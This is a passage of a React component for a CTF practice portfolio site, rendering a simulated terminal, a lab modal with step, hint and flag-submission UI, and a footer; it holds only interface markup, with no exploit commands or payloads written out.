                      <ChevronRight className="h-4 w-4" />
                    </button>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </section>

      {/* EMBEDDED CYBER TERMINAL SIMULATOR */}
      <section id="terminal-section" className="relative z-10 py-12 border-t border-slate-800/80 bg-[#080b12]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-4">
            <div>
              <div className="flex items-center gap-2">
                <Terminal className="h-5 w-5 text-[#00ff66]" />
                <h2 className="text-xl font-bold text-white tracking-tight">
                  Cyber Terminal Simulator
                </h2>
              </div>
              <p className="text-xs text-slate-400 font-mono mt-1">
                Direct interactive sandbox shell · Prompt: <span className="text-[#00ff66]">abdurrahman@ctf-labs:~$</span>
              </p>
            </div>

            {/* Terminal Top Quick Actions */}
            <div className="flex items-center gap-2">
              <button
                onClick={() => {
                  playClick();
                  executeTerminalCommand('help');
                }}
                className="px-2.5 py-1 text-xs font-mono rounded bg-slate-900 border border-slate-800 text-slate-300 hover:text-white"
              >
                help
              </button>
              <button
                onClick={() => {
                  playClick();
                  executeTerminalCommand('skills');
                }}
                className="px-2.5 py-1 text-xs font-mono rounded bg-slate-900 border border-slate-800 text-[#00ff66] hover:bg-[#00ff66]/10"
              >
                skills
              </button>
              <button
                onClick={() => {
                  playClick();
                  executeTerminalCommand('cat flag.txt');
                }}
                className="px-2.5 py-1 text-xs font-mono rounded bg-slate-900 border border-slate-800 text-amber-400 hover:bg-amber-400/10"
              >
                cat flag.txt
              </button>
              <button
                onClick={() => {
                  playClick();
                  executeTerminalCommand('clear');
                }}
                className="px-2.5 py-1 text-xs font-mono rounded bg-slate-900 border border-slate-800 text-slate-400 hover:text-slate-200"
                title="Clear screen"
              >
                clear
              </button>
              <button
                onClick={() => {
                  playClick();
                  setTerminalMaximized(!terminalMaximized);
                }}
                className="p-1 text-slate-400 hover:text-white rounded bg-slate-900 border border-slate-800"
                title={terminalMaximized ? 'Minimize terminal' : 'Maximize terminal'}
              >
                {terminalMaximized ? <Minimize2 className="h-4 w-4" /> : <Maximize2 className="h-4 w-4" />}
              </button>
            </div>
          </div>

          {/* Terminal Window Box */}
          <div
            className={`rounded-lg border border-slate-800 bg-[#0c101a] overflow-hidden shadow-2xl flex flex-col transition-all ${
              terminalMaximized ? 'fixed inset-4 z-50 h-auto' : 'h-[440px]'
            }`}
          >
            {/* Terminal Window Bar */}
            <div className="h-8 bg-[#111624] border-b border-slate-800/80 px-3 flex items-center justify-between">
              <div className="flex items-center gap-1.5">
                <span className="h-3 w-3 rounded-full bg-[#ff5f56]" />
                <span className="h-3 w-3 rounded-full bg-[#ffbd2e]" />
                <span className="h-3 w-3 rounded-full bg-[#27c93f]" />
                <span className="ml-2 text-xs font-mono text-slate-400">
                  abdurrahman@ctf-labs: ~ (bash 5.2)
                </span>
              </div>
              <div className="text-xs font-mono text-slate-500">
                UTF-8 · Tab Autocomplete Enabled
              </div>
            </div>

            {/* Terminal Output Area */}
            <div
              className="flex-1 p-4 font-mono text-xs sm:text-sm overflow-y-auto space-y-2 terminal-scanlines"
              onClick={() => terminalInputRef.current?.focus()}
            >
              {terminalHistory.map((item, idx) => (
                <div key={idx} className="leading-relaxed">
                  {item.type === 'input' ? (
                    <div className="flex items-start gap-2 text-slate-300">
                      <span className="text-[#00ff66] shrink-0">abdurrahman@ctf-labs:~$</span>
                      <span className="text-white font-semibold">{item.text}</span>
                    </div>
                  ) : item.type === 'error' ? (
                    <div className="text-[#ff2a5f] whitespace-pre-wrap">{item.text}</div>
                  ) : item.type === 'success' ? (
                    <div className="text-[#00ff66] whitespace-pre-wrap font-bold">{item.text}</div>
                  ) : (
                    <div className="text-slate-300 whitespace-pre-wrap">{item.text}</div>
                  )}
                </div>
              ))}

              {/* Active Prompt Line */}
              <div className="flex items-center gap-2 pt-1">
                <span className="text-[#00ff66] font-mono shrink-0">abdurrahman@ctf-labs:~$</span>
                <input
                  ref={terminalInputRef}
                  type="text"
                  value={terminalInput}
                  onChange={(e) => setTerminalInput(e.target.value)}
                  onKeyDown={handleTerminalKeyDown}
                  className="flex-1 bg-transparent text-white font-mono text-xs sm:text-sm focus:outline-none caret-[#00ff66]"
                  autoFocus
                  spellCheck={false}
                  autoComplete="off"
                />
              </div>
              <div ref={terminalEndRef} />
            </div>

            {/* Terminal Footnote */}
            <div className="px-3 py-1.5 bg-[#090d16] border-t border-slate-800 text-[11px] font-mono text-slate-500 flex items-center justify-between">
              <span>Commands: help, whoami, ls, cat flag.txt, skills, nmap, sudo -l, clear</span>
              <span className="text-slate-600">Press [Enter] to run · [Up/Down] history</span>
            </div>
          </div>
        </div>
      </section>

      {/* LAB INTERACTIVE EXECUTION MODAL */}
      {activeLab && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 bg-black/85 backdrop-blur-sm overflow-y-auto">
          <div className="relative w-full max-w-4xl rounded-xl border border-slate-700 bg-[#0f1422] shadow-[0_0_40px_rgba(0,0,0,0.8)] overflow-hidden my-auto">
            {/* Modal Header */}
            <div className="px-6 py-4 border-b border-slate-800 bg-[#141b2d] flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="h-8 w-8 rounded bg-[#00ff66]/10 text-[#00ff66] flex items-center justify-center border border-[#00ff66]/30">
                  <Code2 className="h-4 w-4" />
                </div>
                <div>
                  <div className="flex items-center gap-2 text-xs font-mono text-slate-400">
                    <span>{activeLab.id.toUpperCase()}</span>
                    <span>·</span>
                    <span className={activeLab.difficulty === 'Easy' ? 'text-[#00ff66]' : activeLab.difficulty === 'Medium' ? 'text-amber-400' : 'text-[#ff2a5f]'}>
                      {activeLab.difficulty}
                    </span>
                    <span>·</span>
                    <span>{activeLab.category}</span>
                  </div>
                  <h2 className="text-base sm:text-lg font-bold text-white leading-tight">
                    {activeLab.title}
                  </h2>
                </div>
              </div>

              <button
                onClick={closeLabModal}
                className="h-8 w-8 rounded bg-slate-800 text-slate-400 hover:text-white flex items-center justify-center transition-colors"
                title="Close modal"
              >
                ✕
              </button>
            </div>

            {/* Modal Body */}
            <div className="p-6 space-y-6 max-h-[75vh] overflow-y-auto">
              {/* Target & Briefing Card */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 p-4 rounded-lg bg-[#0a0e17] border border-slate-800">
                <div className="font-mono text-xs">
                  <span className="text-slate-500 block">TARGET HOST</span>
                  <span className="text-[#00ff66] font-bold">{activeLab.targetHost}</span>
                </div>
                <div className="font-mono text-xs">
                  <span className="text-slate-500 block">SERVICE PROTOCOL</span>
                  <span className="text-slate-200">{activeLab.targetService}</span>
                </div>
                <div className="font-mono text-xs">
                  <span className="text-slate-500 block">STATUS</span>
                  <span className={solvedLabs.includes(activeLab.id) ? 'text-[#00ff66] font-bold' : 'text-amber-400'}>
                    {solvedLabs.includes(activeLab.id) ? 'SOLVED & LOGGED' : 'IN PROGRESS'}
                  </span>
                </div>

                <div className="md:col-span-3 pt-2 border-t border-slate-800/80 text-xs text-slate-300 leading-relaxed">
                  <span className="text-slate-500 font-mono block mb-1">MISSION OBJECTIVE:</span>
                  {activeLab.objective}
                </div>
              </div>

              {/* Step-by-Step Recon & Exploitation Workflow */}
              <div>
                <h3 className="text-xs font-mono text-slate-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                  <Play className="h-3.5 w-3.5 text-[#00ff66]" />
                  Reconnaissance & Attack Vectors ({activeLab.steps.length} Steps)
                </h3>

                <div className="space-y-3">
                  {activeLab.steps.map((step, sIdx) => {
                    const isChecked = completedSteps[activeLab.id]?.[sIdx] || false;
                    const isSimulated = simulatedStepOutputs[activeLab.id]?.[sIdx] || false;

                    return (
                      <div
                        key={sIdx}
                        className={`p-4 rounded-lg border transition-all ${
                          isChecked
                            ? 'bg-[#111827]/40 border-slate-800 text-slate-400'
                            : 'bg-[#111827] border-slate-800/90 text-slate-200'
                        }`}
                      >
                        <div className="flex items-start justify-between gap-3 mb-2">
                          <div className="flex items-start gap-2.5">
                            <button
                              onClick={() => toggleStep(activeLab.id, sIdx)}
                              className="mt-0.5 text-slate-400 hover:text-[#00ff66] transition-colors"
                            >
                              <CheckSquare className={`h-4 w-4 ${isChecked ? 'text-[#00ff66]' : 'text-slate-600'}`} />
                            </button>
                            <div>
                              <h4 className={`text-sm font-semibold ${isChecked ? 'line-through text-slate-400' : 'text-white'}`}>
                                Step {sIdx + 1}: {step.title}
                              </h4>
                              <p className="text-xs text-slate-400 mt-0.5">{step.description}</p>
                            </div>
                          </div>

                          {step.command && (
                            <button
                              onClick={() => handleCopy(step.command!)}
                              className="px-2 py-1 rounded bg-slate-800/80 border border-slate-700 text-xs font-mono text-slate-300 hover:text-white flex items-center gap-1 shrink-0"
                              title="Copy command"
                            >
                              {copiedCommand === step.command ? (
                                <>
                                  <Check className="h-3 w-3 text-[#00ff66]" />
                                  <span className="text-[#00ff66]">Copied</span>
                                </>
                              ) : (
                                <>
                                  <Copy className="h-3 w-3" />
                                  <span>Copy</span>
                                </>
                              )}
                            </button>
                          )}
                        </div>

                        {step.command && (
                          <div className="mt-2.5 p-2.5 rounded bg-[#0a0e17] border border-slate-800 flex items-center justify-between font-mono text-xs overflow-x-auto">
                            <span className="text-[#00ff66] selection:text-white">
                              $ {step.command}
                            </span>
                            {step.simulatedOutput && (
                              <button
                                onClick={() => handleSimulateCommand(activeLab.id, sIdx)}
                                className="ml-3 px-2 py-0.5 rounded text-[11px] bg-[#00ff66]/10 text-[#00ff66] border border-[#00ff66]/30 hover:bg-[#00ff66]/20 transition-colors shrink-0"
                              >
                                {isSimulated ? 'Re-run Simulation' : 'Run Simulation'}
                              </button>
                            )}
                          </div>
                        )}

                        {/* Simulated Output Drawer */}
                        {isSimulated && step.simulatedOutput && (
                          <div className="mt-2 p-3 rounded bg-[#070a10] border border-slate-800/80 font-mono text-xs text-slate-300">
                            <div className="text-[10px] text-slate-500 mb-1 flex items-center gap-1">
                              <Terminal className="h-3 w-3 text-[#00ff66]" />
                              SIMULATED TARGET RESPONSE:
                            </div>
                            <pre className="whitespace-pre-wrap text-emerald-400/90 leading-snug">
                              {step.simulatedOutput}
                            </pre>
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Hints Accordion */}
              <div className="p-4 rounded-lg bg-[#0a0e17] border border-slate-800">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-2 text-xs font-mono text-slate-300">
                    <HelpCircle className="h-4 w-4 text-amber-400" />
                    <span>HINTS & ASSISTANCE</span>
                  </div>
                  {(revealedHints[activeLab.id] || 0) < activeLab.hints.length && (
                    <button
                      onClick={() => revealNextHint(activeLab.id, activeLab.hints.length)}
                      className="text-xs font-mono text-amber-400 hover:text-amber-300 underline"
                    >
                      Reveal Hint ({(revealedHints[activeLab.id] || 0) + 1}/{activeLab.hints.length})
                    </button>
                  )}
                </div>

                {(revealedHints[activeLab.id] || 0) === 0 ? (
                  <p className="text-xs text-slate-500">
                    No hints revealed yet. Try executing the steps above first. If you are stuck, click "Reveal Hint".
                  </p>
                ) : (
                  <div className="space-y-2 mt-2">
                    {activeLab.hints.slice(0, revealedHints[activeLab.id] || 0).map((hint, hIdx) => (
                      <div key={hIdx} className="p-2 rounded bg-amber-950/20 border border-amber-800/40 text-xs text-amber-200/90 font-mono">
                        <span className="font-bold mr-1">Hint {hIdx + 1}:</span> {hint}
                      </div>
                    ))}
                  </div>
                )}
              </div>

              {/* Flag Submission Bar */}
              <div className="p-4 rounded-lg bg-[#111827] border border-[#00ff66]/30">
                <div className="flex items-center justify-between mb-2">
                  <label className="text-xs font-mono font-bold text-white flex items-center gap-1.5">
                    <Lock className="h-3.5 w-3.5 text-[#00ff66]" />
                    SUBMIT FLAG TO COMPLETE LAB:
                  </label>
                  <span className="text-[11px] font-mono text-slate-500">Format: CTF&#123;...&#125;</span>
                </div>

                <div className="flex items-center gap-2">
                  <input
                    type="text"
                    value={flagInputs[activeLab.id] || ''}
                    onChange={(e) => {
                      const val = e.target.value;
                      setFlagInputs((prev) => ({ ...prev, [activeLab.id]: val }));
                    }}
                    onKeyDown={(e) => {
                      audioEngine.playKeypress();
                      if (e.key === 'Enter') {
                        handleFlagSubmit(activeLab.id, activeLab.flag);
                      }
                    }}
                    placeholder="Enter captured flag (e.g., CTF{...})"
                    className="flex-1 px-3 py-2 rounded bg-[#0a0e17] border border-slate-700 text-xs font-mono text-[#00ff66] placeholder-slate-600 focus:outline-none focus:border-[#00ff66]"
                  />
                  <button
                    onClick={() => handleFlagSubmit(activeLab.id, activeLab.flag)}
                    className="px-4 py-2 rounded bg-[#00ff66] text-[#0a0e17] font-mono text-xs font-bold hover:bg-[#00e55c] transition-all shadow-[0_0_15px_rgba(0,255,102,0.2)]"
                  >
                    Verify Flag
                  </button>
                </div>

                {flagFeedback[activeLab.id] && (
                  <div
                    className={`mt-2.5 p-2.5 rounded text-xs font-mono flex items-center gap-2 ${
                      flagFeedback[activeLab.id]?.type === 'success'
                        ? 'bg-[#00ff66]/10 text-[#00ff66] border border-[#00ff66]/30'
                        : 'bg-[#ff2a5f]/10 text-[#ff2a5f] border border-[#ff2a5f]/30'
                    }`}
                  >
                    {flagFeedback[activeLab.id]?.type === 'success' ? (
                      <CheckCircle2 className="h-4 w-4 shrink-0" />
                    ) : (
                      <AlertTriangle className="h-4 w-4 shrink-0" />
                    )}
                    <span>{flagFeedback[activeLab.id]?.message}</span>
                  </div>
                )}
              </div>
            </div>

            {/* Modal Footer */}
            <div className="px-6 py-3 border-t border-slate-800 bg-[#141b2d] flex items-center justify-between text-xs font-mono text-slate-400">
              <span>CTF / LABS Interactive Execution Environment</span>
              <button
                onClick={closeLabModal}
                className="px-3 py-1 rounded bg-slate-800 text-slate-200 hover:text-white"
              >
                Close Lab
              </button>
            </div>
          </div>
        </div>
      )}

      {/* FOOTER */}
      <footer className="relative z-10 border-t border-slate-800/80 bg-[#070b13] py-8">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs font-mono text-slate-500">
          <div>
            © CTF / LABS — Developed & Maintained by Abdurrahman
          </div>
          <div className="flex items-center gap-4 text-slate-400">
            <span>Red Team Practice Platform</span>
            <span>·</span>
            <span>All Exploits Sandboxed</span>
            <span>·</span>
            <span className="text-[#00ff66]">Active Status: Online</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
